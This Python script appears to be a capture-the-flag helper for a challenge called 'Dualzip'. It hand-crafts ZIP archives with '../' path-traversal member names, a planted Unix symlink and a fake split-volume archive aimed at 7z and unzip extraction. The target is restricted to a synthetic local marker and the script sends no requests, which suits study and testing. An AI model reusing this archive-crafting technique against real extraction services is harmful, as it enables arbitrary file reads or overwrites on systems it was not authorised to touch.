"""Inspect a synthetic two-stage ZIP volume and Unix symlink fixture.

Recreates the public Dualzip challenge's ZIP data structures. Does not send
requests to a server or access /flag. Full 7z/unzip exploit is NOT claimed.
"""
import argparse
import hashlib
import io
import re
import struct
import zlib
import zipfile
from dataclasses import dataclass
from pathlib import Path

def p16(v: int) -> bytes:
    return struct.pack("<H", v)

def p32(v: int) -> bytes:
    return struct.pack("<I", v)

@dataclass(frozen=True)
class Entry:
    name: bytes
    data: bytes
    mode: int = 0o100644

    def local_header(self) -> bytes:
        if not self.name or len(self.name) > 65535 or len(self.data) > 0xffffffff:
            raise ValueError("Invalid ZIP member")
        return (p32(0x04034B50) + p16(10) + p16(0) + p16(0)
                + p16(0) + p16(0) + p32(zlib.crc32(self.data))
                + p32(len(self.data)) + p32(len(self.data))
                + p16(len(self.name)) + p16(0) + self.name)

    def central_header(self, offset: int, disk: int = 0) -> bytes:
        return (p32(0x02014B50) + p16(0x031E) + p16(10)
                + p16(0) * 4 + p32(zlib.crc32(self.data))
                + p32(len(self.data)) * 2
                + p16(len(self.name)) + p16(0) + p16(0)
                + p16(disk) + p16(0) + p32(self.mode << 16)
                + p32(offset) + self.name)

def eocd(n: int, size: int, offset: int, disk: int = 0) -> bytes:
    if n < 0 or n > 65535:
        raise ValueError("Invalid ZIP member count")
    return (p32(0x06054B50) + p16(disk) + p16(disk)
            + p16(n) * 2 + p32(size) + p32(offset) + p16(0))

def build_zip(entries: list[Entry]) -> bytes:
    body, directory = bytearray(), bytearray()
    for entry in entries:
        start = len(body)
        body.extend(entry.local_header())
        body.extend(entry.data)
        directory.extend(entry.central_header(start))
    return bytes(body + directory + eocd(len(entries), len(directory), len(body)))

@dataclass(frozen=True)
class Fixture:
    setup_zip: bytes
    final_zip: bytes
    stem: str
    first_name: bytes
    second_name: bytes

def build_synthetic_fixture(target: bytes = b"/ctf-local-marker") -> Fixture:
    if not target.startswith(b"/ctf-local-") or b"\x00" in target:
        raise ValueError("Only synthetic local targets are allowed")
    member = Entry(b"sample.txt", b" " * 1024)
    first_volume = member.local_header()
    final = b" " * 1024
    directory = member.central_header(0, disk=0)
    final += directory + eocd(1, len(directory), 1024, disk=2)
    stem = hashlib.sha256(final).hexdigest()
    first_name = f"../{stem}.z01".encode()
    second_name = f"../{stem}.z02".encode()
    setup = build_zip([
        Entry(first_name, first_volume),
        Entry(second_name, target, mode=0o120644),
    ])
    return Fixture(setup, final, stem, first_name, second_name)

def inspect_setup(data: bytes) -> tuple[list[str], bytes]:
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        entries = archive.infolist()
        symlinks = [e for e in entries
                    if ((e.external_attr >> 16) & 0o170000) == 0o120000]
        if len(entries) != 2 or len(symlinks) != 1:
            raise ValueError("Expected two ZIP members including one symlink")
        return [entry.filename for entry in entries], archive.read(symlinks[0])

def validate_source(source: str) -> None:
    required = (
        r'extract\(\["7z",\s*"x",\s*"-y"\],\s*\["7z",\s*"a"\]\)',
        r'extract\(\["unzip",\s*"-:"\],\s*\["zip",\s*"-y",\s*"-r"\]\)',
        r'sha256\(filedata\)\.hexdigest\(\)',
    )
    if any(re.search(pattern, source) is None for pattern in required):
        raise ValueError("Original Dualzip source differs from this fixture")

def solve(source: str) -> Fixture:
    validate_source(source)
    artifact = build_synthetic_fixture()
    members, target = inspect_setup(artifact.setup_zip)
    if target != b"/ctf-local-marker" or len(members) != 2:
        raise ValueError("Unexpected ZIP contents")
    return artifact

def main() -> None:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("source", type=Path)
    p.add_argument("output_dir", type=Path)
    args = p.parse_args()
    artifact = solve(args.source.read_text(encoding="utf-8"))
    args.output_dir.mkdir(parents=True, exist_ok=True)
    (args.output_dir / "setup.zip").write_bytes(artifact.setup_zip)
    (args.output_dir / "final.zip").write_bytes(artifact.final_zip)
    print("Synthetic two-stage ZIP created:", artifact.stem)
    print("No original server exploitation or hosted flag recovery claimed.")

if __name__ == "__main__":
    main()
